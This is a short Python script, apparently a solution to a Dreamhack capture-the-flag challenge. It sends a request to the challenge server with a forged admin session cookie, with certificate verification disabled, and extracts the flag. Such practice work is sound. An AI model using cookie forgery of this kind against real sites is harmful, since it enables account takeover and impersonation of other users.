import requests
import re

cookies = {
        'username': 'admin',
        'sessionid': '81a424d51dcc99bb57fa8083a0c3fb154d621385380dff8ba14814ae27c407b6'}

response = requests.get("http://host3.dreamhack.games:15027/", verify=False, cookies=cookies)
# verify=False SSL 인증서 에러가 나서 추가해줬다.

regex = re.compile('^DH{.*}$')
print(regex.findall(response.text))
print(response.text)
